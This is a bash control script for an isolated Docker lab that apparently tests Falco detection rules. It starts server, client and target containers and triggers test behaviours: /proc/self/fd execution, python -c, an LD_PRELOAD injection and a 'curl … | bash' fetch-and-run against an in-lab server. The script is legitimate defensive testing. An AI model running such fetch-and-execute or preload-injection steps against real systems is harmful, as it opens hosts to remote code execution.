#!/usr/bin/env bash

set -Eeuo pipefail

NET="${NET:-falco-lab}"

SERVER="falco-lab-server"
TARGET="falco-lab-target"
CLIENT="falco-lab-client"

SERVER_IMAGE="falco-lab-server:latest"
TARGET_IMAGE="falco-lab-target:latest"
CLIENT_IMAGE="falco-lab-client:latest"

usage() {
cat <<EOF
Usage:
  sudo ./labctl.sh up
  sudo ./labctl.sh status
  sudo ./labctl.sh test-procfd
  sudo ./labctl.sh test-python
  sudo ./labctl.sh test-curl
  sudo ./labctl.sh test-preload
  sudo ./labctl.sh down

Commands:

  up
      Create the isolated Docker network and start:
        - falco-lab-server
        - falco-lab-client
        - falco-lab-target

  status
      Show Docker network and container status.

  test-procfd
      Run /proc/self/fd/N execution inside target.

  test-python
      Run benign Python -c execution inside target.

  test-curl
      Run:
        curl http://falco-lab-server:8000/test.sh | bash
      inside the client container.

  test-preload
      Run benign LD_PRELOAD test inside target.

  down
      Remove all three lab containers and the lab network.
EOF
}

need_image() {
    local image="$1"

    if ! docker image inspect "$image" >/dev/null 2>&1; then
        echo "[ERROR] Missing image: $image" >&2
        echo "Build the lab images first:" >&2
        echo "  sudo ./build_lab_containers.sh" >&2
        exit 1
    fi
}

container_exists() {
    docker inspect "$1" >/dev/null 2>&1
}

container_running() {
    [[ "$(docker inspect -f '{{.State.Running}}' "$1" 2>/dev/null || echo false)" == "true" ]]
}

ensure_network() {
    if ! docker network inspect "$NET" >/dev/null 2>&1; then
        echo "[+] Creating internal Docker network: $NET"
        docker network create --internal "$NET" >/dev/null
    fi
}

require_lab_running() {
    if ! container_running "$TARGET"; then
        echo "[ERROR] $TARGET is not running."
        echo "Run:"
        echo "  sudo ./labctl.sh up"
        exit 1
    fi
}

case "${1:-}" in

up)
    echo "[+] Checking images..."

    need_image "$SERVER_IMAGE"
    need_image "$TARGET_IMAGE"
    need_image "$CLIENT_IMAGE"

    ensure_network

    echo "[+] Removing old lab containers..."

    docker rm -f \
        "$SERVER" \
        "$TARGET" \
        "$CLIENT" \
        >/dev/null 2>&1 || true

    echo "[+] Starting server..."

    docker run -d \
        --name "$SERVER" \
        --network "$NET" \
        --network-alias "$SERVER" \
        "$SERVER_IMAGE" \
        >/dev/null

    echo "[+] Starting target..."

    docker run -d \
        --name "$TARGET" \
        --network "$NET" \
        "$TARGET_IMAGE" \
        >/dev/null

    echo "[+] Starting client..."

    docker run -d \
        --name "$CLIENT" \
        --network "$NET" \
        "$CLIENT_IMAGE" \
        >/dev/null

    echo
    echo "========================================"
    echo " LAB UP"
    echo " Network : $NET"
    echo "========================================"
    echo

    docker ps \
        --filter "name=^/${SERVER}$" \
        --filter "name=^/${CLIENT}$" \
        --filter "name=^/${TARGET}$" \
        --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"

    ;;

status)
    echo
    echo "========== Docker Network =========="
    docker network inspect "$NET" 2>/dev/null || true

    echo
    echo "========== Lab Containers =========="
    docker ps -a \
        --filter "name=^/${SERVER}$" \
        --filter "name=^/${CLIENT}$" \
        --filter "name=^/${TARGET}$" \
        --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Networks}}"

    echo
    ;;

test-procfd)
    require_lab_running

    echo "[+] Running #3: /proc/self/fd/N execution"
    echo

    docker exec \
        "$TARGET" \
        /usr/local/bin/procfd_exec_test

    echo
    echo "[+] #3 completed."
    ;;

test-python)
    require_lab_running

    echo "[+] Running #4: Python -c interpreter"
    echo

    docker exec \
        "$TARGET" \
        /usr/local/bin/python3 \
        -c 'print("FALCO_PYTHON_MEMORY_TEST")'

    echo
    echo "[+] #4 completed."
    ;;

test-curl)
    if ! container_running "$CLIENT"; then
        echo "[ERROR] $CLIENT is not running."
        echo "Run:"
        echo "  sudo ./labctl.sh up"
        exit 1
    fi

    if ! container_running "$SERVER"; then
        echo "[ERROR] $SERVER is not running."
        echo "Run:"
        echo "  sudo ./labctl.sh up"
        exit 1
    fi

    echo "[+] Running #5: curl | bash"
    echo
    echo "    CLIENT -> curl -> SERVER -> test.sh -> stdin -> bash"
    echo

    docker exec \
        "$CLIENT" \
        /bin/bash \
        -c 'set -o pipefail; curl -fsS http://falco-lab-server:8000/test.sh | bash'

    echo
    echo "[+] #5 completed."
    ;;

test-preload)
    require_lab_running

    echo "[+] Running #6: LD_PRELOAD injection"
    echo

    docker exec \
        -e LD_PRELOAD=/usr/local/lib/libpreload_test.so \
        "$TARGET" \
        /bin/echo \
        FALCO_PRELOAD_EXEC

    echo
    echo "[+] #6 completed."
    ;;

down)
    echo "[+] Removing lab containers..."

    docker rm -f \
        "$SERVER" \
        "$CLIENT" \
        "$TARGET" \
        >/dev/null 2>&1 || true

    echo "[+] Removing lab network..."

    docker network rm "$NET" >/dev/null 2>&1 || true

    echo
    echo "[+] Lab stopped and cleaned."
    ;;

-h|--help|help)
    usage
    ;;

*)
    usage
    exit 1
    ;;

esac
